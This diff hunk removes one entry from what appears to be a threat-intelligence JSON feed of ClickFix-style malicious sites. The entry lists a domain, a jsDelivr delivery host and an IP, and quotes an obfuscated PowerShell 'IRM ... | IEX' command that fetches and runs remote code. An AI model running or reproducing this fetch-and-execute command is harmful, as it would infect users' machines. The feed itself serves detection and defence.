@@ -8869,23 +8869,5 @@
     ],
     "ReportId": "cmw9saotl05gj0omlanf5buol",
     "ScannedAt": "2026-11-09T21:39:28.225000+00:00"
-  },
-  {
-    "UrlDomain": "sky247official.com",
-    "DeliveryUrl": [
-      "cdn.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [],
-    "Payload": "Hex/obfuscated IP delivery: ...ntLoaded', startCallbackPolling); <!-- clickfix-observer-corpus --> IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/447349472638/0845D1a-D29D-43e2-AcD9-356Ea09250ec/d5-b17A-Ee4F8c9323af | IEX IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/447349472...",
-    "ResolvedDownloadUrl": [
-      "https://cdn.jsdelivr.net/gh/447349472638/0845D1a-D29D-43e2-AcD9-356Ea09250ec/d5-b17A-Ee4F8c9323af",
-      "https://cdn.jsdelivr.net/gh/447349472"
-    ],
-    "ReportId": "cmw9s0e8w050u0oml3hvppp7a",
-    "ScannedAt": "2026-11-09T21:31:27.980000+00:00"
   }
 ]
